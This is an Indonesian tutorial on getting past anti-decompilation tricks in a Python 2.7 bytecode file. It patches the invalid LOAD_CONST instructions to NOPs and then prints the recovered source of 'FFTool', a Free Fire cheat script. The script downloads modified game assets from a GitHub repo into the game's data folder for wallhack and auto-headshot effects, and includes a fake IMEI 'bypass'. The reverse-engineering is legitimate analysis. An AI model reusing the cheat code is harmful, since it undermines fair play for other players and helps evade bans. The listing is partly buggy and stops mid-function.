# Dekompilasi Script Tools Free Fire (FFTool)

## Pendahuluan

Beberapa waktu lalu, ada yang menanyakan sebuah file python bytecode yang katanya memiliki proteksi anti dekompilasi. Script tersebut bernama **FFTool**. 

## Langkah-langkah

* Pertama cek dulu tipe dari script tersebut:

```bash
% file fftool.py
fftool.py: python 2.7 byte-compiled
```

* Karena tipenya adalah python bytecode, kita akan mengganti ekstensi file tersebut menjadi **pyc** dan mencoba melakukan dekompilasi menggunakan beberapa _tools_ dekompilasi python bytecode. Pertama, kita akan menggunakan [uncompyle6](https://github.com/rocky/python-uncompyle6/):

```bash
% mv fftool.py fftool.pyc
% uncompyle6 fftool.pyc
# uncompyle6 version 3.7.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Jul 20 2020, 00:00:00)
# [GCC 10.1.1 20200507 (Red Hat 10.1.1-1)]
# Embedded file name: fftool.py
# Compiled at: 2020-03-15 11:10:46
Traceback (most recent call last):
  File "/home/thanos/.local/bin/uncompyle6", line 11, in <module>
    load_entry_point('uncompyle6==3.7.3', 'console_scripts', 'uncompyle6')()
  File "build/bdist.linux-x86_64/egg/uncompyle6/bin/uncompile.py", line 194, in main_bin
  File "build/bdist.linux-x86_64/egg/uncompyle6/main.py", line 324, in main
  File "build/bdist.linux-x86_64/egg/uncompyle6/main.py", line 222, in decompile_file
  File "build/bdist.linux-x86_64/egg/uncompyle6/main.py", line 141, in decompile
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 2643, in code_deparse
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 2461, in gen_source
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 426, in traverse
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 404, in preorder
  File "/home/thanos/.local/lib/python2.7/site-packages/spark_parser/ast.py", line 117, in preorder
    self.preorder(kid)
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 404, in preorder
  File "/home/thanos/.local/lib/python2.7/site-packages/spark_parser/ast.py", line 112, in preorder
    self.default(node)
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 2181, in default
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 2087, in template_engine
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 404, in preorder
  File "/home/thanos/.local/lib/python2.7/site-packages/spark_parser/ast.py", line 110, in preorder
    func(node)
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 870, in n_mkfunc
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/pysource.py", line 883, in make_function
  File "build/bdist.linux-x86_64/egg/uncompyle6/semantics/make_function2.py", line 89, in make_function2
  File "build/bdist.linux-x86_64/egg/uncompyle6/scanner.py", line 97, in __init__
  File "build/bdist.linux-x86_64/egg/uncompyle6/scanners/scanner2.py", line 211, in ingest
  File "build/bdist.linux-x86_64/egg/uncompyle6/scanner.py", line 132, in build_instructions
  File "/home/thanos/.local/lib/python2.7/site-packages/xdis/bytecode.py", line 197, in get_instructions_bytes
    argval, argrepr = _get_const_info(arg, constants)
  File "/home/thanos/.local/lib/python2.7/site-packages/xdis/bytecode.py", line 84, in _get_const_info
    argval = const_list[const_index]
IndexError: tuple index out of range
```

* Ternyata muncul pesan **IndexError: tuple index out of range**. Selanjutnya kita akan mencoba menggunakan [pycdc](https://github.com/zrax/pycdc) untuk melakukan dekompilasi:

```bash
% pycdc fftool.pyc
# Source Generated with Decompyle++
# File: fftool.pyc (Python 2.7)

import os
import sys
import requests
from tqdm import tqdm
import time
lonte = '    \x1b[1;91m    \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f     \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93\n        \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81   \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab \xe2\x94\xa3 \xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x83     \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\n        \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\xbb   \xe2\x94\xbb \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b\n  \x1b[0m<\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81>\n     [\x1b[1;92m+\x1b[0m] Creator : Jhosua Kz         [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Channel : Anonymous Central [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Program : Python            [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Type    : Tools Free Fire   [\x1b[1;92m+\x1b[0m]\n'

def on():
zsh: segmentation fault (core dumped)  pycdc fftool.pyc
```

* Ternyata **pycdc** berhasil melakukan dekompilasi pada bagian awal script tersebut sebelum akhirnya mengalami _segfault_. Karena kedua _tools_ tersebut mengalami error ketika melakukan dekompilasi, kita akan mencoba melakukan disassembly terhadap script tersebut menggunakan **pycdas**:

```bash
% pycdas fftool.pyc
            [Disassembly]
                0       JUMP_ABSOLUTE           6
Error disassembling fftool.pyc: vector::_M_range_check: __n (which is 65535) >= this->size() (which is 20)
                3       LOAD_CONST              65535:
```

* Bisa terlihat bahwa instruksi bytecode yang menyebabkan error adalah bagian ini:

```python
3       LOAD_CONST              65535
```

* Opcode python untuk `LOAD_CONST` adalah **0x64** yang dapat dilihat pada [tabel opcode ini](https://github.com/python/cpython/blob/master/Include/opcode.h), sedangkan **65535** dalam heksadesimal adalah **0xffff** berarti bytecode instruksi yang menyebabkan error tersebut adalah **64 ff ff**. Kita dapat menggunakan hex editor untuk mencari byte tersebut. Pada tutorial kali ini digunakan **XXD** yang pada umumnya dapat ditemukan pada distro linux mainstream. Kekurangan dari **XXD** adalah, karena kolomnya secara default adalah 16 byte, jadi bisa saja bytecode instruksi yang kita cari terlewatkan. Kita akan menggabungkan **XXD** dan **grep** atau **ripgrep** untuk menampilkan hanya bagian yang kita cari seperti ini:

```bash
% xxd -g1 fftool.pyc | rg '64 ff ff'
000003a0: 71 06 00 64 ff ff 74 00 00 6a 01 00 64 01 00 83  q..d..t..j..d...
00007fa0: 43 00 00 00 73 10 01 00 00 71 06 00 64 ff ff 74  C...s....q..d..t
```

* Bisa terlihat bahwa ada 2 kali ditemukan bytecode yang kita cari. Kita akan mengganti instruksi tersebut dengan instruksi `NOP` yaitu **0x09**. Kita akan menggunakan **XXD** untuk melakukan proses _patching_ seperti ini:

```bash
% echo -n '000003a0: 71 06 00 09 09 09 74 00 00 6a 01 00 64 01 00 83' | xxd -r - fftool.pyc
% echo -n '00007fa0: 43 00 00 00 73 10 01 00 00 71 06 00 09 09 09 74' | xxd -r - fftool.pyc
```

* Setelah melakukan proses patching, kita lanjutkan dengan melakukan dekompilasi menggunakan uncompyle6:

```bash
% uncompyle6 fftool.pyc
# uncompyle6 version 3.7.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Jul 20 2020, 00:00:00)
# [GCC 10.1.1 20200507 (Red Hat 10.1.1-1)]
# Embedded file name: fftool.py
# Compiled at: 2020-03-15 11:10:46
import os, sys, requests
from tqdm import tqdm
import time
lonte = '    \x1b[1;91m    \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f     \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93\n        \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81   \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab \xe2\x94\xa3 \xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x83     \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\n        \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\xbb   \xe2\x94\xbb \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b\n  \x1b[0m<\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81>\n     [\x1b[1;92m+\x1b[0m] Creator : Jhosua Kz         [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Channel : Anonymous Central [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Program : Python            [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Type    : Tools Free Fire   [\x1b[1;92m+\x1b[0m]\n'

def on--- This code section failed: ---

 L.   9         0  JUMP_ABSOLUTE         6  'to 6'
                3  NOP
                4  NOP
                5  NOP
                6  LOAD_GLOBAL           0  'os'
                9  LOAD_ATTR             1  'system'
               12  LOAD_CONST               'cd /sdcard/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/'
               15  CALL_FUNCTION_1       1  None
               18  POP_TOP

 L.  10        19  LOAD_GLOBAL           0  'os'
               22  LOAD_ATTR             1  'system'
               25  LOAD_CONST               'rm assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D'
               28  CALL_FUNCTION_1       1  None
               31  POP_TOP

 L.  11        32  LOAD_GLOBAL           0  'os'
               35  LOAD_ATTR             1  'system'
               38  LOAD_CONST               'clear'
               41  CALL_FUNCTION_1       1  None
               44  POP_TOP

 L.  12        45  LOAD_CONST               '[!] Sedang Memasang ...'
               48  PRINT_ITEM
               49  PRINT_NEWLINE_CONT

 L.  13        50  LOAD_CONST               5000
               53  STORE_FAST            0  'chunk_size'

 L.  14        56  LOAD_CONST               'https://github.com/B4TAK/HelloQimak/blob/master/asu/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true'
               59  STORE_FAST            1  'url'

 L.  15        62  LOAD_GLOBAL           2  'requests'
               65  LOAD_ATTR             3  'get'
               68  LOAD_FAST             1  'url'
               71  LOAD_CONST               'stream'
               74  LOAD_GLOBAL           4  'True'
               77  CALL_FUNCTION_257   257  None
               80  STORE_FAST            2  'r'

 L.  16        83  LOAD_GLOBAL           5  'int'
               86  LOAD_FAST             2  'r'
               89  LOAD_ATTR             6  'headers'
               92  LOAD_CONST               'content-length'
               95  BINARY_SUBSCR
               96  CALL_FUNCTION_1       1  None
               99  STORE_FAST            3  'size'

 L.  17       102  LOAD_FAST             1  'url'
              105  LOAD_ATTR             7  'split'
              108  LOAD_CONST               '/'
              111  CALL_FUNCTION_1       1  None
              114  LOAD_CONST               -1
              117  BINARY_SUBSCR
              118  STORE_FAST            4  'filename'

 L.  18       121  LOAD_GLOBAL           8  'open'
              124  LOAD_FAST             4  'filename'
              127  LOAD_CONST               'wb'
              130  CALL_FUNCTION_2       2  None
              133  SETUP_WITH           74  'to 210'
              136  STORE_FAST            5  'f'

 L.  19       139  SETUP_LOOP           64  'to 206'
              142  LOAD_GLOBAL           9  'tqdm'
              145  LOAD_CONST               'iterable'
              148  LOAD_FAST             2  'r'
              151  LOAD_ATTR            10  'iter_content'
              154  LOAD_CONST               'chunk_size'
              157  LOAD_FAST             0  'chunk_size'
              160  CALL_FUNCTION_256   256  None
              163  LOAD_CONST               'total'
              166  LOAD_FAST             3  'size'
              169  LOAD_FAST             0  'chunk_size'
              172  BINARY_DIVIDE
              173  LOAD_CONST               'unit'
              176  LOAD_CONST               ' KB'
              179  CALL_FUNCTION_768   768  None
              182  GET_ITER
              183  FOR_ITER             19  'to 205'
              186  STORE_FAST            6  'data'

 L.  20       189  LOAD_FAST             5  'f'
              192  LOAD_ATTR            11  'write'
              195  LOAD_FAST             6  'data'
              198  CALL_FUNCTION_1       1  None
              201  POP_TOP
              202  JUMP_BACK           183  'to 183'
              205  POP_BLOCK
            206_0  COME_FROM           139  '139'
              206  POP_BLOCK
              207  LOAD_CONST               None
            210_0  COME_FROM_WITH      133  '133'
              210  WITH_CLEANUP
              211  END_FINALLY

 L.  21       212  LOAD_GLOBAL           0  'os'
              215  LOAD_ATTR             1  'system'
              218  LOAD_CONST               "mv 'assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D"
              221  CALL_FUNCTION_1       1  None
              224  POP_TOP

 L.  22       225  LOAD_GLOBAL           0  'os'
              228  LOAD_ATTR             1  'system'
              231  LOAD_CONST               'clear'
              234  CALL_FUNCTION_1       1  None
              237  POP_TOP

 L.  23       238  LOAD_GLOBAL          12  'lonte'
              241  PRINT_ITEM
              242  PRINT_NEWLINE_CONT

 L.  24       243  LOAD_CONST               '[\x1b[1;92m+\x1b[0m] Anthena On [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
              246  PRINT_ITEM
              247  PRINT_NEWLINE_CONT

 L.  25       248  LOAD_GLOBAL          13  'time'
              251  LOAD_ATTR            14  'sleep'
              254  LOAD_CONST               4.5
              257  CALL_FUNCTION_1       1  None
              260  POP_TOP

 L.  26       261  LOAD_GLOBAL          15  'menu'
              264  CALL_FUNCTION_0       0  None
              267  POP_TOP

Parse error at or near `None' instruction at offset -1


def off():
    os.system('cd /sdcard/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/')
    os.system('rm assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D')
    os.system('clear')
    print '[+] Uninstall... '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/test/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Anthena Off [\x1b[1;91m\xe2\x9c\x96\x1b[0m]'
    time.sleep(4.5)
    menu()

# ----- snip -----

# file fftool.pyc
# Deparsing stopped due to parse error
```

* Muncul pesan error, namun sebagian besar file tersebut berhasil didekompilasi. Untuk bagian awal yang tidak berhasil didekompilasi secara sempurna, namun berhasil di-disassemble, dapat dengan mudah kita dekompilasi secara manual. Berikut ini adalah bagian awal yang didekompilasi secara manual dari disassembly tersebut:

```python

def on():
    os.system('cd /sdcard/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/')
    os.system('rm assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D')
    os.system('clear')
    print '[!] Sedang Memasang ...'
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/asu/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true'
    r = request.get(url, stream=True)
    size = int(r.headers['content-length'])
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)
    os.system("mv 'assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Anthena On [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()
```

* Dengan demikian, maka script tersebut berhasil kita dekompilasi. Berikut ini adalah script lengkap hasil dekompilasi **FFTool** tersebut:

```python
import os, sys, requests
from tqdm import tqdm
import time
lonte = '    \x1b[1;91m    \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x8f     \xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93\n        \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81   \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab \xe2\x94\xa3 \xe2\x94\x81\xe2\x94\x81\xe2\x94\x93 \xe2\x94\x83     \xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\n        \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\xbb   \xe2\x94\xbb \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b \xe2\x94\x97\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x9b\n  \x1b[0m<\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81>\n     [\x1b[1;92m+\x1b[0m] Creator : Jhosua Kz         [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Channel : Anonymous Central [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Program : Python            [\x1b[1;92m+\x1b[0m]\n     [\x1b[1;92m+\x1b[0m] Type    : Tools Free Fire   [\x1b[1;92m+\x1b[0m]\n'

def on():
    os.system('cd /sdcard/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/')
    os.system('rm assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D')
    os.system('clear')
    print '[!] Sedang Memasang ...'
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/asu/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true'
    r = request.get(url, stream=True)
    size = int(r.headers['content-length'])
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)
    os.system("mv 'assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Anthena On [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def off():
    os.system('cd /sdcard/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/')
    os.system('rm assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D')
    os.system('clear')
    print '[+] Uninstall... '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/test/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Anthena Off [\x1b[1;91m\xe2\x9c\x96\x1b[0m]'
    time.sleep(4.5)
    menu()


def head():
    print '[~] SELECT : '
    print '\n[\x1b[1;91m1\x1b[0m]. Turn (\x1b[1;92mOn\x1b[0m)'
    print '[\x1b[1;91m2\x1b[0m]. Turn (\x1b[1;91mOff\x1b[0m)'
    print '[\x1b[1;91m0\x1b[0m]. \x1b[1;91mBack\x1b[0m'
    xc = raw_input('\n-> ')
    if xc == '1':
        on()
    elif xc == '2':
        off()
    elif xc == '0':
        menu()
    else:
        zx = raw_input('\n\n[\x1b[1;91m!\x1b[0m] \x1b[1;91mWrong\x1b[0m Input... Press \x1b[1;91mEnter\x1b[0m to Back!!!')
        menu()


def handon():
    os.system('cd /sdcard/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/')
    os.system('rm assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D')
    os.system('clear')
    print '[!] Sedang Memasang ...'
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/key/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Anthena Hand On [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def handoff():
    os.system('cd /sdcard/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/')
    os.system('rm assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D')
    os.system('clear')
    print '[+] Uninstall... '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/test/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/avatar/assetindexer.P55WLj4N0lYAZDYI48MHMRu0lZ8~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m]nthena Off [\x1b[1;91m\xe2\x9c\x96\x1b[0m]'
    time.sleep(4.5)
    menu()


def hand():
    print '[~] SELECT : '
    print '\n[\x1b[1;91m1\x1b[0m]. Turn (\x1b[1;92mOn\x1b[0m)'
    print '[\x1b[1;91m2\x1b[0m]. Turn (\x1b[1;91mOff\x1b[0m)'
    print '[\x1b[1;91m0\x1b[0m]. \x1b[1;91mBack\x1b[0m'
    fucek = raw_input('\n\xe2\x9e\x9b ')
    if fucek == '1':
        handon()
    elif fucek == '2':
        handoff()
    elif fucek == '0':
        menu()
    else:
        zx = raw_input('\n\n[\x1b[1;91m!\x1b[0m] \x1b[1;91mWrong\x1b[0m Input... Press \x1b[1;91mEnter\x1b[0m to Back!!!')
        menu()


def random():
    os.system('clear')
    print lonte
    print '\n[\x1b[1;91m!\x1b[0m] Please installed the Free Fire Support ID'
    print '[\x1b[1;92m+\x1b[0m] Enter 15 numbers randomly'
    jhosua = raw_input('\n[\x1b[1;92m>\x1b[0m] Enter Number : \x1b[1;93m')
    time.sleep(5)
    gago = open('/sdcard/ffid.txt', 'w')
    gago.write(jhosua)
    gago.close()
    print '\x1b[0m[>] Bypass Imei Succes [\x1b[1;91m!\x1b[0m]'
    time.sleep(4.5)
    menu()


def fake():
    os.system('clear')
    print lonte
    print '[\x1b[1;92m1\x1b[0m]. Create Imei'
    print '[\x1b[1;91m0\x1b[0m]. \x1b[1;91mBack\x1b[0m'
    kz = raw_input('\n\xe2\x9e\x9b ')
    if kz == '1':
        random()
    if kz == '0':
        menu()
    else:
        zx = raw_input('\n\n[\x1b[1;91m!\x1b[0m] \x1b[1;91mWrong\x1b[0m Input... Press \x1b[1;91mEnter\x1b[0m to Back!!!')
        menu()


def headshot():
    os.system('clear')
    print '[+] Install... '
    time.sleep(3)
    os.system('cd auto')
    os.system('cp optionalab_01.GfmkTHeehfGq5K6L4YL2Av7YlR27~2D /sdcard/Android/data/com.dts.freefireth/files/contentcache/Optional/android/optionallocres/gameassetbundles/')
    os.system('clear')
    print lonte
    print '[+] Config Auto Headshot [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def china():
    os.system('clear')
    print '[+]. Install...'
    chunk_size = 50000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/setan/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

    os.system("mv 'lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true' /storage/emulated/0/Android/data/com.dts.freefireth/files/contentcache/Compulsory/android/gameassetbundles/ui/background/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D")
    os.system('clear')
    print lonte
    print '[\x1b[1;92m+\x1b[0m] Success [\x1b[1;92m\xe2\x9c\x94\x1b[0m]'
    time.sleep(4.5)
    menu()


def akatsuki():
    os.system('clear')
    print '[+] Install... '
    chunk_size = 5000
    url = 'https://github.com/B4TAK/HelloQimak/blob/master/Santuy/lobby_snowbg_halloween.2n65YN5HAOCfUGBrwme2S8dqvK4~3D?raw=true'
    r = requests.get(url, stream=True)
    size = int(r.headers['content-length'])
    filename = url.split('/')[(-1)]
    with open(filename, 'wb') as (f):
        for data in tqdm(iterable=r.iter_content(chunk_size=chunk_size), total=size / chunk_size, unit=' KB'):
            f.write(data)

